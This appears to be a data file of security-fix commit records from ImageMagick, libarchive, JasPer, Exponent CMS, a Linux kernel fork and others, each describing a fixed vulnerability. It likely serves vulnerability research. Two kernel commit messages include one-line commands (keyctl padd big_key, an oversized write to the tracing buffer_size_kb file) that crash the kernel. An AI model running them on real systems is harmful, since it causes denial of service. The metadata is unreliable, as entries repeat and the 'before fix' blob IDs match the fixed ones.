m4vdec: Check for non-startcode 00 00 00 sequences in probe\n\nThis makes the m4v detection less trigger-happy.\n\nBug-Id: 949 Signed-off-by: Diego Biurrun <diego@biurrun.de>

======================================================================
Commit With Fix: 
    6e48aa92ff4e6e95424300ecd52a9ea453c19c60
File(s) In Commit: 
    coders/tiff.c
Blob(s) In Commit: 
    daab01eba1b4094c72a3b9585ad333c63b3e9d48
Blob(s) Before Fix: 
    daab01eba1b4094c72a3b9585ad333c63b3e9d48
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 6e48aa92ff4e6e95424300ecd52a9ea453c19c60:
https://github.com/ImageMagick/ImageMagick/issues/268

======================================================================
Commit With Fix: 
    7f17c791dcfd8c0416e2cd2485b19410e47ef126
File(s) In Commit: 
    libarchive/archive_read_support_format_7zip.c
Blob(s) In Commit: 
    c0a536c4a981cae29c19d508acc281c3d02b8835
Blob(s) Before Fix: 
    c0a536c4a981cae29c19d508acc281c3d02b8835
Projects:
    AasemShokr_libarchive
Commit Message for 7f17c791dcfd8c0416e2cd2485b19410e47ef126:
Issue 761:  Heap overflow reading corrupted 7Zip files\n\nThe sample file that demonstrated this had multiple 'EmptyStream' attributes.  The first one ended up being used to calculate certain statistics, then was overwritten by the second which was incompatible with those statistics.\n\nThe fix here is to reject any header with multiple EmptyStream attributes.  While here, also reject headers with multiple EmptyFile, AntiFile, Name, or Attributes markers.

======================================================================
Commit With Fix: 
    d8c2604cd438c41ec72aff52c16ebd8183068020
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    55d34d674fdf3d27be4e4d167dc86efc6142dcf9
Blob(s) Before Fix: 
    55d34d674fdf3d27be4e4d167dc86efc6142dcf9
Projects:
    did-g_jasper
Commit Message for d8c2604cd438c41ec72aff52c16ebd8183068020:
Added range check on XRsiz and YRsiz fields of SIZ marker segment.

======================================================================
Commit With Fix: 
    d8c2604cd438c41ec72aff52c16ebd8183068020
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    55d34d674fdf3d27be4e4d167dc86efc6142dcf9
Blob(s) Before Fix: 
    55d34d674fdf3d27be4e4d167dc86efc6142dcf9
Projects:
    did-g_jasper
Commit Message for d8c2604cd438c41ec72aff52c16ebd8183068020:
Added range check on XRsiz and YRsiz fields of SIZ marker segment.

======================================================================
Commit With Fix: 
    44a524e367597af58d6265ae2014468b334d0309
File(s) In Commit: 
    src/libjasper/base/jas_stream.c
Blob(s) In Commit: 
    29e4291cb689b003502e1df40ba4c4b47af9df84
Blob(s) Before Fix: 
    29e4291cb689b003502e1df40ba4c4b47af9df84
Projects:
    did-g_jasper
Commit Message for 44a524e367597af58d6265ae2014468b334d0309:
The memory stream interface allows for a buffer size of zero. The case of a zero-sized buffer was not handled correctly, as it could lead to a double free. This problem has now been fixed (hopefully). One might ask whether a zero-sized buffer should be allowed at all, but this is a question for another day.

======================================================================
Commit With Fix: 
    9590232bb4f4cc824f3425a6e1349afbe6d6d2b7
File(s) In Commit: 
    drivers/staging/android/ion/ion.c
Blob(s) In Commit: 
    33b390e7ea31174558dd95e5da961a61464999e3
Blob(s) Before Fix: 
    33b390e7ea31174558dd95e5da961a61464999e3
Projects:
    0-T-0_ps4-linux
Commit Message for 9590232bb4f4cc824f3425a6e1349afbe6d6d2b7:
staging/android/ion : fix a race condition in the ion driver\n\nThere is a use-after-free problem in the ion driver. This is caused by a race condition in the ion_ioctl() function.\n\nA handle has ref count of 1 and two tasks on different cpus calls ION_IOC_FREE simultaneously.\n\ncpu 0                                   cpu 1 ------------------------------------------------------- ion_handle_get_by_id() (ref == 2)                             ion_handle_get_by_id()                             (ref == 3)\n\nion_free() (ref == 2)\n\nion_handle_put() (ref == 1)\n\n                            ion_free()                             (ref == 0 so ion_handle_destroy() is                             called                             and the handle is freed.)\n\n                            ion_handle_put() is called and it                             decreases the slub's next free pointer\n\nThe problem is detected as an unaligned access in the spin lock functions since it uses load exclusive  instruction. In some cases it corrupts the slub's free pointer which causes a mis-aligned access to the next free pointer.(kmalloc returns a pointer like ffffc0745b4580aa). And it causes lots of other hard-to-debug problems.\n\nThis symptom is caused since the first member in the ion_handle structure is the reference count and the ion driver decrements the reference after it has been freed.\n\nTo fix this problem client->lock mutex is extended to protect all the codes that uses the handle.\n\nSigned-off-by: Eun Taik Lee <eun.taik.lee@samsung.com> Reviewed-by: Laura Abbott <labbott@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    1c109fabbd51863475cd12ac206bdd249aee35af
File(s) In Commit: 
    arch/x86/include/asm/uaccess.h
Blob(s) In Commit: 
    2131c4ce7d8a10698c45626e2781dd8f1cb2f9b9
Blob(s) Before Fix: 
    2131c4ce7d8a10698c45626e2781dd8f1cb2f9b9
Projects:
    0-T-0_ps4-linux
Commit Message for 1c109fabbd51863475cd12ac206bdd249aee35af:
fix minor infoleak in get_user_ex()\n\nget_user_ex(x, ptr) should zero x on failure.  It's not a lot of a leak (at most we are leaking uninitialized 64bit value off the kernel stack, and in a fairly constrained situation, at that), but the fix is trivial, so...\n\nCc: stable@vger.kernel.org Signed-off-by: Al Viro <viro@zeniv.linux.org.uk> [ This sat in different branch from the uaccess fixes since mid-August ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    0ce8b94d745b818bd207933d9a2e7f32587c2c89
File(s) In Commit: 
    framework/modules/core/controllers/expHTMLEditorController.php
Blob(s) In Commit: 
    10623b6e7e1ad429a3285a5c07a4b872c0e4dd39
Blob(s) Before Fix: 
    10623b6e7e1ad429a3285a5c07a4b872c0e4dd39
Projects:
    nwtn_exponent-cms
Commit Message for 0ce8b94d745b818bd207933d9a2e7f32587c2c89:
better fix security vulnerability in editor preview  reported by fyth

======================================================================
Commit With Fix: 
    93362fa47fe98b62e4a34ab408c4a418432e7939
File(s) In Commit: 
    fs/proc/proc_sysctl.c
Blob(s) In Commit: 
    d4e37acd48217dcb1090a1ee68bb4ec4cb7226e5
Blob(s) Before Fix: 
    d4e37acd48217dcb1090a1ee68bb4ec4cb7226e5
Projects:
    0-T-0_ps4-linux
Commit Message for 93362fa47fe98b62e4a34ab408c4a418432e7939:
sysctl: Drop reference added by grab_header in proc_sys_readdir\n\nFixes CVE-2016-9191, proc_sys_readdir doesn't drop reference added by grab_header when return from !dir_emit_dots path. It can cause any path called unregister_sysctl_table will wait forever.\n\nThe calltrace of CVE-2016-9191:\n\n[ 5535.960522] Call Trace: [ 5535.963265]  [<ffffffff817cdaaf>] schedule+0x3f/0xa0 [ 5535.968817]  [<ffffffff817d33fb>] schedule_timeout+0x3db/0x6f0 [ 5535.975346]  [<ffffffff817cf055>] ? wait_for_completion+0x45/0x130 [ 5535.982256]  [<ffffffff817cf0d3>] wait_for_completion+0xc3/0x130 [ 5535.988972]  [<ffffffff810d1fd0>] ? wake_up_q+0x80/0x80 [ 5535.994804]  [<ffffffff8130de64>] drop_sysctl_table+0xc4/0xe0 [ 5536.001227]  [<ffffffff8130de17>] drop_sysctl_table+0x77/0xe0 [ 5536.007648]  [<ffffffff8130decd>] unregister_sysctl_table+0x4d/0xa0 [ 5536.014654]  [<ffffffff8130deff>] unregister_sysctl_table+0x7f/0xa0 [ 5536.021657]  [<ffffffff810f57f5>] unregister_sched_domain_sysctl+0x15/0x40 [ 5536.029344]  [<ffffffff810d7704>] partition_sched_domains+0x44/0x450 [ 5536.036447]  [<ffffffff817d0761>] ? __mutex_unlock_slowpath+0x111/0x1f0 [ 5536.043844]  [<ffffffff81167684>] rebuild_sched_domains_locked+0x64/0xb0 [ 5536.051336]  [<ffffffff8116789d>] update_flag+0x11d/0x210 [ 5536.057373]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450 [ 5536.064186]  [<ffffffff81167acb>] ? cpuset_css_offline+0x1b/0x60 [ 5536.070899]  [<ffffffff810fce3d>] ? trace_hardirqs_on+0xd/0x10 [ 5536.077420]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450 [ 5536.084234]  [<ffffffff8115a9f5>] ? css_killed_work_fn+0x25/0x220 [ 5536.091049]  [<ffffffff81167ae5>] cpuset_css_offline+0x35/0x60 [ 5536.097571]  [<ffffffff8115aa2c>] css_killed_work_fn+0x5c/0x220 [ 5536.104207]  [<ffffffff810bc83f>] process_one_work+0x1df/0x710 [ 5536.110736]  [<ffffffff810bc7c0>] ? process_one_work+0x160/0x710 [ 5536.117461]  [<ffffffff810bce9b>] worker_thread+0x12b/0x4a0 [ 5536.123697]  [<ffffffff810bcd70>] ? process_one_work+0x710/0x710 [ 5536.130426]  [<ffffffff810c3f7e>] kthread+0xfe/0x120 [ 5536.135991]  [<ffffffff817d4baf>] ret_from_fork+0x1f/0x40 [ 5536.142041]  [<ffffffff810c3e80>] ? kthread_create_on_node+0x230/0x230\n\nOne cgroup maintainer mentioned that "cgroup is trying to offline a cpuset css, which takes place under cgroup_mutex.  The offlining ends up trying to drain active usages of a sysctl table which apprently is not happening." The real reason is that proc_sys_readdir doesn't drop reference added by grab_header when return from !dir_emit_dots path. So this cpuset offline path will wait here forever.\n\nSee here for details: http://www.openwall.com/lists/oss-security/2016/11/04/13\n\nFixes: f0c3b5093add ("[readdir] convert procfs") Cc: stable@vger.kernel.org Reported-by: CAI Qian <caiqian@redhat.com> Tested-by: Yang Shukui <yangshukui@huawei.com> Signed-off-by: Zhou Chengming <zhouchengming1@huawei.com> Acked-by: Al Viro <viro@ZenIV.linux.org.uk> Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    6172f67620ac13fc2f4e9d650c61937d48e9ecb9
File(s) In Commit: 
    framework/modules/core/controllers/expRatingController.php
Blob(s) In Commit: 
    7090008407de9b5980476f9df069f180cc225d90
Blob(s) Before Fix: 
    7090008407de9b5980476f9df069f180cc225d90
Projects:
    nwtn_exponent-cms
Commit Message for 6172f67620ac13fc2f4e9d650c61937d48e9ecb9:
fix security vulnerability in ratings  reported by fyth

======================================================================
Commit With Fix: 
    fffb2038de4c603931b785a4c3ec69cfd06181ba
File(s) In Commit: 
    framework/core/controllers/expController.php
Blob(s) In Commit: 
    17516b7563a64cf94d8d958808c1392e97697740
Blob(s) Before Fix: 
    17516b7563a64cf94d8d958808c1392e97697740
Projects:
    nwtn_exponent-cms
Commit Message for fffb2038de4c603931b785a4c3ec69cfd06181ba:
fix sql injection security vulnerability  reported by Nicky [#1394 state:resolved] [#1395 state:resolved]

======================================================================
Commit With Fix: 
    e83721a5b9fcc88e1141a8fb29c3d1bd522257c1
File(s) In Commit: 
    framework/modules/search/controllers/searchController.php
Blob(s) In Commit: 
    fc1f9630b37a3a5359cbc7a9ca0f07cd9c3b59ea
Blob(s) Before Fix: 
    fc1f9630b37a3a5359cbc7a9ca0f07cd9c3b59ea
Projects:
    nwtn_exponent-cms
Commit Message for e83721a5b9fcc88e1141a8fb29c3d1bd522257c1:
fix security vulnerability in search method, reported by pang0lin

======================================================================
Commit With Fix: 
    559792be727f4e731bfcb3935f5beec7749e9ce9
File(s) In Commit: 
    framework/core/subsystems/expRouter.php
Blob(s) In Commit: 
    5600779a5d4766a61848ac48bfd7e1dec5ebe928
Blob(s) Before Fix: 
    5600779a5d4766a61848ac48bfd7e1dec5ebe928
Projects:
    nwtn_exponent-cms
Commit Message for 559792be727f4e731bfcb3935f5beec7749e9ce9:
fix sql injection security vulnerability which failed to account for sef urls adequately  reported by many, many users

======================================================================
Commit With Fix: 
    e7b6856ac384bf2b8ea7761a1e46d6e4186d36f4
File(s) In Commit: 
    framework/modules/users/controllers/usersController.php
Blob(s) In Commit: 
    3b4568633edaf7945df873a7b61a28f53da0b155
Blob(s) Before Fix: 
    3b4568633edaf7945df873a7b61a28f53da0b155
Projects:
    nwtn_exponent-cms
Commit Message for e7b6856ac384bf2b8ea7761a1e46d6e4186d36f4:
fix security vulnerability to get user list, reported by pang0lin

======================================================================
Commit With Fix: 
    9eeed1e82fb9e6d0d41e7dd10672df48045a9b59
File(s) In Commit: 
    framework/modules/addressbook/controllers/addressController.php
Blob(s) In Commit: 
    a874da8735d5081e40e1552e26dbc64f7cf9e3ae
Blob(s) Before Fix: 
    a874da8735d5081e40e1552e26dbc64f7cf9e3ae
Projects:
    nwtn_exponent-cms
Commit Message for 9eeed1e82fb9e6d0d41e7dd10672df48045a9b59:
fix security vulnerability to editing addresses, countries, and regions  reported by pang0lin

======================================================================
Commit With Fix: 
    e38aae66c785f08f3907aa121378caf71ca5f2d7
File(s) In Commit: 
    framework/modules/users/controllers/usersController.php
Blob(s) In Commit: 
    352c982c4e3094053f94b2b48602766d4896404c
Blob(s) Before Fix: 
    352c982c4e3094053f94b2b48602766d4896404c
Projects:
    nwtn_exponent-cms
Commit Message for e38aae66c785f08f3907aa121378caf71ca5f2d7:
Prevent logged in uses from view other user records and admins from super-admin records  thanks to pang0lin

======================================================================
Commit With Fix: 
    4327ea96b3de89440693e06d03038121aa1fdcea
File(s) In Commit: 
    framework/modules/notfound/controllers/notfoundController.php
Blob(s) In Commit: 
    fc8bab066b7c0434e67cb1547731b19298a5304c
Blob(s) Before Fix: 
    fc8bab066b7c0434e67cb1547731b19298a5304c
Projects:
    nwtn_exponent-cms
Commit Message for 4327ea96b3de89440693e06d03038121aa1fdcea:
fix sql injection issue in notfound controller  reported by pang0lin

======================================================================
Commit With Fix: 
    2ddffb2e7eafe4830e3483a4b437873022c461ba
File(s) In Commit: 
    framework/modules/navigation/controllers/navigationController.php
Blob(s) In Commit: 
    ebe59313bfc605a9aff07272f9464495ae0dc220
Blob(s) Before Fix: 
    ebe59313bfc605a9aff07272f9464495ae0dc220
Projects:
    nwtn_exponent-cms
Commit Message for 2ddffb2e7eafe4830e3483a4b437873022c461ba:
fix security vulnerability to reranking pages  reported by kyohpc

======================================================================
Commit With Fix: 
    7df3e59c3d1df4f87fe874c7956ef7a3d2f4d5fb
File(s) In Commit: 
    security/keys/big_key.c
Blob(s) In Commit: 
    835c1ab30d01eb9a8e94b411fce09b856772efb9
Blob(s) Before Fix: 
    835c1ab30d01eb9a8e94b411fce09b856772efb9
Projects:
    0-T-0_ps4-linux
Commit Message for 7df3e59c3d1df4f87fe874c7956ef7a3d2f4d5fb:
KEYS: Sort out big_key initialisation\n\nbig_key has two separate initialisation functions, one that registers the key type and one that registers the crypto.  If the key type fails to register, there's no problem if the crypto registers successfully because there's no way to reach the crypto except through the key type.\n\nHowever, if the key type registers successfully but the crypto does not, big_key_rng and big_key_blkcipher may end up set to NULL - but the code neither checks for this nor unregisters the big key key type.\n\nFurthermore, since the key type is registered before the crypto, it is theoretically possible for the kernel to try adding a big_key before the crypto is set up, leading to the same effect.\n\nFix this by merging big_key_crypto_init() and big_key_init() and calling the resulting function late.  If they're going to be encrypted, we shouldn't be creating big_keys before we have the facilities to do the encryption available.  The key type registration is also moved after the crypto initialisation.\n\nThe fix also includes message printing on failure.\n\nIf the big_key type isn't correctly set up, simply doing:\n\n	dd if=/dev/zero bs=4096 count=1 | keyctl padd big_key a @s\n\nought to cause an oops.\n\nFixes: 13100a72f40f5748a04017e0ab3df4cf27c809ef ('Security: Keys: Big keys stored encrypted') Signed-off-by: David Howells <dhowells@redhat.com> cc: Peter Hlavaty <zer0mem@yahoo.com> cc: Kirill Marinushkin <k.marinushkin@gmail.com> cc: Artem Savkov <asavkov@redhat.com> cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    d91198abd00fc435a397fe6bad906a4c1748e9cf
File(s) In Commit: 
    src/libjasper/jpc/jpc_dec.c
Blob(s) In Commit: 
    4f24660ddeaa55145a0019f0be5142f08642d848
Blob(s) Before Fix: 
    4f24660ddeaa55145a0019f0be5142f08642d848
Projects:
    did-g_jasper
Commit Message for d91198abd00fc435a397fe6bad906a4c1748e9cf:
Fixed another integer overflow problem.

======================================================================
Commit With Fix: 
    f7038068550fba0e41e1d0c355787f1dcd5bf330
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Blob(s) Before Fix: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Projects:
    did-g_jasper
Commit Message for f7038068550fba0e41e1d0c355787f1dcd5bf330:
Added some missing sanity checks on the data in a SIZ marker segment.

======================================================================
Commit With Fix: 
    f7038068550fba0e41e1d0c355787f1dcd5bf330
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Blob(s) Before Fix: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Projects:
    did-g_jasper
Commit Message for f7038068550fba0e41e1d0c355787f1dcd5bf330:
Added some missing sanity checks on the data in a SIZ marker segment.

======================================================================
Commit With Fix: 
    f7038068550fba0e41e1d0c355787f1dcd5bf330
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Blob(s) Before Fix: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Projects:
    did-g_jasper
Commit Message for f7038068550fba0e41e1d0c355787f1dcd5bf330:
Added some missing sanity checks on the data in a SIZ marker segment.

======================================================================
Commit With Fix: 
    d43527cfa0dbb3ccefec4a6f7b32c1434739aa29
File(s) In Commit: 
    Str.c
Blob(s) In Commit: 
    d34129fcbed971f92fc7ab91ff1ebad8bacab908
Blob(s) Before Fix: 
    d34129fcbed971f92fc7ab91ff1ebad8bacab908
Projects:
    ii0_w3m
Commit Message for d43527cfa0dbb3ccefec4a6f7b32c1434739aa29:
Merge pull request #27 from kcwu/fix-strgrow\n\nFix potential heap buffer corruption due to Strgrow

======================================================================
Commit With Fix: 
    bf911e985d6bbaa328c20c3e05f4eb03de11fdd6
File(s) In Commit: 
    net/sctp/sm_statefuns.c
Blob(s) In Commit: 
    8ec20a64a3f8055a0c3576627c5ec5dad7e99ca8
Blob(s) Before Fix: 
    8ec20a64a3f8055a0c3576627c5ec5dad7e99ca8
Projects:
    0-T-0_ps4-linux
Commit Message for bf911e985d6bbaa328c20c3e05f4eb03de11fdd6:
sctp: validate chunk len before actually using it\n\nAndrey Konovalov reported that KASAN detected that SCTP was using a slab beyond the boundaries. It was caused because when handling out of the blue packets in function sctp_sf_ootb() it was checking the chunk len only after already processing the first chunk, validating only for the 2nd and subsequent ones.\n\nThe fix is to just move the check upwards so it's also validated for the 1st chunk.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Reviewed-by: Xin Long <lucien.xin@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ce98a7acbcfca7f0a178f4b1e7b957e419e0cc99
File(s) In Commit: 
    coders/sgi.c
Blob(s) In Commit: 
    a0eebe97df822f4255b3778cb85654a0d95ff346
Blob(s) Before Fix: 
    a0eebe97df822f4255b3778cb85654a0d95ff346
Projects:
    2016repotsheyue_ImageMagick
Commit Message for ce98a7acbcfca7f0a178f4b1e7b957e419e0cc99:
https://github.com/ImageMagick/ImageMagick/issues/301

======================================================================
Commit With Fix: 
    1abc2e5a401a4bf1d5ca4df91358ce5df111f495
File(s) In Commit: 
    src/libjasper/jpc/jpc_dec.c
Blob(s) In Commit: 
    1da54a79660fdf282eb86d9d96b9af11580ed728
Blob(s) Before Fix: 
    1da54a79660fdf282eb86d9d96b9af11580ed728
Projects:
    did-g_jasper
Commit Message for 1abc2e5a401a4bf1d5ca4df91358ce5df111f495:
Fixed an array overflow problem in the JPC decoder.

======================================================================
Commit With Fix: 
    a0ac402cfcdc904f9772e1762b3fda112dcc56a0
File(s) In Commit: 
    block/blk-map.c
Blob(s) In Commit: 
    27fd8d92892d47e3478d9bcf3e1294a8eb28da89
Blob(s) Before Fix: 
    27fd8d92892d47e3478d9bcf3e1294a8eb28da89
Projects:
    0-T-0_ps4-linux
Commit Message for a0ac402cfcdc904f9772e1762b3fda112dcc56a0:
Don't feed anything but regular iovec's to blk_rq_map_user_iov\n\nIn theory we could map other things, but there's a reason that function is called "user_iov".  Using anything else (like splice can do) just confuses it.\n\nReported-and-tested-by: Johannes Thumshirn <jthumshirn@suse.de> Cc: Al Viro <viro@ZenIV.linux.org.uk> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    cadff5fb6e73398de26a92e96d3d7cac893af255
File(s) In Commit: 
    src/bin/jp2/converttif.c
Blob(s) In Commit: 
    c690f8bfd25a512117489ff5acfdc729900e82b6
Blob(s) Before Fix: 
    c690f8bfd25a512117489ff5acfdc729900e82b6
Projects:
    01bui_openjpeg
Commit Message for cadff5fb6e73398de26a92e96d3d7cac893af255:
These changes repair bugs of #871 and #872

======================================================================
Commit With Fix: 
    cadff5fb6e73398de26a92e96d3d7cac893af255
File(s) In Commit: 
    src/bin/jp2/converttif.c
Blob(s) In Commit: 
    c690f8bfd25a512117489ff5acfdc729900e82b6
Blob(s) Before Fix: 
    c690f8bfd25a512117489ff5acfdc729900e82b6
Projects:
    01bui_openjpeg
Commit Message for cadff5fb6e73398de26a92e96d3d7cac893af255:
These changes repair bugs of #871 and #872

======================================================================
Commit With Fix: 
    ef85b67385436ddc1998f45f1d6a210f935b3388
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    24db5fb6f575af27d3b61a67b15ce9996158ed8b
Blob(s) Before Fix: 
    24db5fb6f575af27d3b61a67b15ce9996158ed8b
Projects:
    0-T-0_ps4-linux
Commit Message for ef85b67385436ddc1998f45f1d6a210f935b3388:
kvm: nVMX: Allow L1 to intercept software exceptions (#BP and #OF)\n\nWhen L2 exits to L0 due to "exception or NMI", software exceptions (#BP and #OF) for which L1 has requested an intercept should be handled by L1 rather than L0. Previously, only hardware exceptions were forwarded to L1.\n\nSigned-off-by: Jim Mattson <jmattson@google.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    2e83b79b2d6c78bf1b4aa227938a214dcbddc83f
File(s) In Commit: 
    fs/xfs/xfs_attr_list.c
Blob(s) In Commit: 
    4fa14820e2e22b687ef852b81e1d6b9f9028caf3
Blob(s) Before Fix: 
    4fa14820e2e22b687ef852b81e1d6b9f9028caf3
Projects:
    0-T-0_ps4-linux
Commit Message for 2e83b79b2d6c78bf1b4aa227938a214dcbddc83f:
xfs: fix two memory leaks in xfs_attr_list.c error paths\n\nThis plugs 2 trivial leaks in xfs_attr_shortform_list and xfs_attr3_leaf_list_int.\n\nSigned-off-by: Mateusz Guzik <mguzik@redhat.com> Cc: <stable@vger.kernel.org> Reviewed-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>\n\n

======================================================================
Commit With Fix: 
    59643d1535eb220668692a5359de22545af579f6
File(s) In Commit: 
    kernel/trace/ring_buffer.c
Blob(s) In Commit: 
    9c143739b8d73f0c7982be06eb0e5cdb902bfc81
Blob(s) Before Fix: 
    9c143739b8d73f0c7982be06eb0e5cdb902bfc81
Projects:
    0-T-0_ps4-linux
Commit Message for 59643d1535eb220668692a5359de22545af579f6:
ring-buffer: Prevent overflow of size in ring_buffer_resize()\n\nIf the size passed to ring_buffer_resize() is greater than MAX_LONG - BUF_PAGE_SIZE then the DIV_ROUND_UP() will return zero.\n\nHere's the details:\n\n  # echo 18014398509481980 > /sys/kernel/debug/tracing/buffer_size_kb\n\ntracing_entries_write() processes this and converts kb to bytes.\n\n 18014398509481980 << 10 = 18446744073709547520\n\nand this is passed to ring_buffer_resize() as unsigned long size.\n\n size = DIV_ROUND_UP(size, BUF_PAGE_SIZE) \n\nWhere DIV_ROUND_UP(a, b) is (a + b - 1)/b\n\nBUF_PAGE_SIZE is 4080 and here\n\n 18446744073709547520 + 4080 - 1 = 18446744073709551599\n\nwhere 18446744073709551599 is still smaller than 2^64\n\n 2^64 - 18446744073709551599 = 17\n\nBut now 18446744073709551599 / 4080 = 4521260802379792\n\nand size = size * 4080 = 18446744073709551360\n\nThis is checked to make sure its still greater than 2 * 4080, which it is.\n\nThen we convert to the number of buffer pages needed.\n\n nr_page = DIV_ROUND_UP(size, BUF_PAGE_SIZE)\n\nbut this time size is 18446744073709551360 and\n\n 2^64 - (18446744073709551360 + 4080 - 1) = -3823\n\nThus it overflows and the resulting number is less than 4080, which makes\n\n  3823 / 4080 = 0\n\nan nr_pages is set to this. As we already checked against the minimum that nr_pages may be, this causes the logic to fail as well, and we crash the kernel.\n\nThere's no reason to have the two DIV_ROUND_UP() (that's just result of historical code changes), clean up the code and fix this bug.\n\nCc: stable@vger.kernel.org # 3.5+ Fixes: 83f40318dab00 ("ring-buffer: Make removal of ring buffer pages atomic") Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    2117d5398c81554fbf803f5fd1dc55eb78216c0c
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    a3ce9d260d68756fa675ce40994b79aedd206413
Blob(s) Before Fix: 
    a3ce9d260d68756fa675ce40994b79aedd206413
Projects:
    0-T-0_ps4-linux
Commit Message for 2117d5398c81554fbf803f5fd1dc55eb78216c0c:
KVM: x86: drop error recovery in em_jmp_far and em_ret_far\n\nem_jmp_far and em_ret_far assumed that setting IP can only fail in 64 bit mode, but syzkaller proved otherwise (and SDM agrees). Code segment was restored upon failure, but it was left uninitialized outside of long mode, which could lead to a leak of host kernel stack. We could have fixed that by always saving and restoring the CS, but we take a simpler approach and just break any guest that manages to fail as the error recovery is error-prone and modern CPUs don't need emulator for this.\n\nFound by syzkaller:\n\n  WARNING: CPU: 2 PID: 3668 at arch/x86/kvm/emulate.c:2217 em_ret_far+0x428/0x480   Kernel panic - not syncing: panic_on_warn set ...\n\n  CPU: 2 PID: 3668 Comm: syz-executor Not tainted 4.9.0-rc4+ #49   Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011    [...]   Call Trace:    [...] __dump_stack lib/dump_stack.c:15    [...] dump_stack+0xb3/0x118 lib/dump_stack.c:51    [...] panic+0x1b7/0x3a3 kernel/panic.c:179    [...] __warn+0x1c4/0x1e0 kernel/panic.c:542    [...] warn_slowpath_null+0x2c/0x40 kernel/panic.c:585    [...] em_ret_far+0x428/0x480 arch/x86/kvm/emulate.c:2217    [...] em_ret_far_imm+0x17/0x70 arch/x86/kvm/emulate.c:2227    [...] x86_emulate_insn+0x87a/0x3730 arch/x86/kvm/emulate.c:5294    [...] x86_emulate_instruction+0x520/0x1ba0 arch/x86/kvm/x86.c:5545    [...] emulate_instruction arch/x86/include/asm/kvm_host.h:1116    [...] complete_emulated_io arch/x86/kvm/x86.c:6870    [...] complete_emulated_mmio+0x4e9/0x710 arch/x86/kvm/x86.c:6934    [...] kvm_arch_vcpu_ioctl_run+0x3b7a/0x5a90 arch/x86/kvm/x86.c:6978    [...] kvm_vcpu_ioctl+0x61e/0xdd0 arch/x86/kvm/../../../virt/kvm/kvm_main.c:2557    [...] vfs_ioctl fs/ioctl.c:43    [...] do_vfs_ioctl+0x18c/0x1040 fs/ioctl.c:679    [...] SYSC_ioctl fs/ioctl.c:694    [...] SyS_ioctl+0x8f/0xc0 fs/ioctl.c:685    [...] entry_SYSCALL_64_fastpath+0x1f/0xc2\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Fixes: d1442d85cc30 ("KVM: x86: Handle errors when RIP is set during far jumps") Signed-off-by: Radim Krčmář <rkrcmar@redhat.com>

======================================================================
Commit With Fix: 
    b98b0bc8c431e3ceb4b26b0dfc8db509518fb290
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    00a074dbfe9bf169c2b81498e6ae265199745b22
Blob(s) Before Fix: 
    00a074dbfe9bf169c2b81498e6ae265199745b22
Projects:
    0-T-0_ps4-linux
Commit Message for b98b0bc8c431e3ceb4b26b0dfc8db509518fb290:
net: avoid signed overflows for SO_{SND|RCV}BUFFORCE\n\nCAP_NET_ADMIN users should not be allowed to set negative sk_sndbuf or sk_rcvbuf values, as it can lead to various memory corruptions, crashes, OOM...\n\nNote that before commit 82981930125a ("net: cleanups in sock_setsockopt()"), the bug was even more serious, since SO_SNDBUF and SO_RCVBUF were vulnerable.\n\nThis needs to be backported to all known linux kernels.\n\nAgain, many thanks to syzkaller team for discovering this gem.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3aa02cb664c5fb1042958c8d1aa8c35055a2ebc4
File(s) In Commit: 
    sound/core/pcm_lib.c
Blob(s) In Commit: 
    0aca39762ed0ec981fb4f612741010a255a97587
Blob(s) Before Fix: 
    0aca39762ed0ec981fb4f612741010a255a97587
Projects:
    0-T-0_ps4-linux
Commit Message for 3aa02cb664c5fb1042958c8d1aa8c35055a2ebc4:
